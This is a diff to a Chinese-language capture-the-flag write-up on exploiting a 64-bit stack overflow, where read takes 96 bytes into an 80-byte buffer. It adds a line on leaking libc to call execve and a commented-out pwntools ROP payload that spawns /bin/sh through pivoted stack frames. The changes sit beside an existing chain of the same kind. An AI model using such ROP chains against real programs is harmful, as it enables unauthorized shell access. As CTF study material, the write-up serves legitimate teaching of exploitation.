@@ -233,6 +233,8 @@ int sub_400676()
 
 可以看出read读96字节但buf长度已经有80字节，所以只能覆盖saved rbp和retaddr
 
+这个题的思路是泄露libc执行execve
+
 #### leak stack
 
 我们使用`puts`函数leak出save rbp，然后就能根据`RBP`的值推算出栈上各个数据的地址
@@ -344,6 +346,9 @@ pop_rdx_rbx_ret = libc.address+0x90529
 # execve("/bin/sh", 0, 0)
 print("/bin/sh ",hex(next(libc.search(b"/bin/sh"))))
 print("execve", hex(libc.sym['execve']))
+
+# payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), pop_rsi_ret, p64(0), pop_rdx_rbx_ret, p64(0), p64(0xdeadbeef), libc.sym['execve'],(80 - 8*9)*b"a", buf - 0x30, 0x4006be])
+
 payload=flat([b'22222222', pop_rdi_ret, next(libc.search(b"/bin/sh")),pop_rsi_ret,p64(0),pop_rdx_rbx_ret,p64(0),p64(0xdeadbeef), libc.sym['execve'], (80 - 9*8 ) * b'2', buf - 0x30, 0x4006be])
 # 此payload和之前的类似，但不同之处是最后是buf - 0x30
 # 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置
